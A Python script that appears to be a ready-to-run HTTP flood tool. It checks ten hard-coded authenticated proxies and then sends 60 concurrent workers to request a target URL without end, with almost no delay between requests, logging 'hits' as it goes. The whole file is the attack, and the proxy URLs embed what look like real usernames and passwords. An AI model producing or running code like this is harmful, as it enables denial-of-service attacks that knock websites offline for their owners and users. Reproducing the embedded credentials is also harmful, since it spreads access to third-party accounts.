import asyncio
import aiohttp
import os
import random

def log(msg):
    print(f"{msg}", flush=True)

class SparxWebshareVerified:
    def __init__(self):
        self.target = os.environ.get("TARGET_URL", "")
        self.stats = {"success": 0, "failed": 0}
        self.concurrency = 60 # Balanced for 10 elite proxies
        
        # Your exact credentials and IPs from the uploaded list
        self.proxies = [
            "http://nwllkxds:li0q0dyj1sdw@191.96.254.138:6185",
            "http://nwllkxds:li0q0dyj1sdw@142.111.67.146:5611",
            "http://nwllkxds:li0q0dyj1sdw@216.10.27.159:6837",
            "http://nwllkxds:li0q0dyj1sdw@64.137.96.74:6641",
            "http://nwllkxds:li0q0dyj1sdw@198.105.121.200:6462",
            "http://nwllkxds:li0q0dyj1sdw@107.172.163.27:6543",
            "http://nwllkxds:li0q0dyj1sdw@45.38.107.97:6014",
            "http://nwllkxds:li0q0dyj1sdw@198.23.239.134:6540",
            "http://nwllkxds:li0q0dyj1sdw@23.95.150.145:6114",
            "http://nwllkxds:li0q0dyj1sdw@31.59.20.176:6754"
        ]

    async def verify_and_attack(self, session, proxy, sem):
        # Step 1: Verification (Just like your requests snippet)
        try:
            async with session.get("https://ipv4.webshare.io/", proxy=proxy, timeout=10) as v:
                ip_val = await v.text()
                log(f"✅ PROXY VERIFIED: {ip_val.strip()}")
        except Exception as e:
            log(f"⚠️ Proxy verification failed: {proxy}")
            return

        # Step 2: Main Loop
        while True:
            async with sem:
                try:
                    # Requesting the target using the exact auth method
                    async with session.get(self.target, proxy=proxy, timeout=10) as r:
                        # Any response confirms the proxy tunnel is alive
                        self.stats["success"] += 1
                except:
                    self.stats["failed"] += 1
                
                # Maintain the machine gun rhythm
                await asyncio.sleep(0.05)

            if (self.stats["success"] + self.stats["failed"]) % 50 == 0:
                log(f"🚀 [VERIFIED BURST] HITS: {self.stats['success']} | FAIL: {self.stats['failed']}")

    async def start(self):
        if not self.target:
            log("❌ ERROR: No target URL!")
            return

        log(f"🔥 INITIALIZING VERIFIED TUNNELS ON: {self.target}")
        sem = asyncio.Semaphore(self.concurrency)
        
        # Use a high-limit connector to prevent bottlenecking
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            # Assign each worker a specific proxy to keep the logic clean
            for i in range(self.concurrency):
                p = self.proxies[i % len(self.proxies)]
                tasks.append(self.verify_and_attack(session, p, sem))
            await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(SparxWebshareVerified().start())
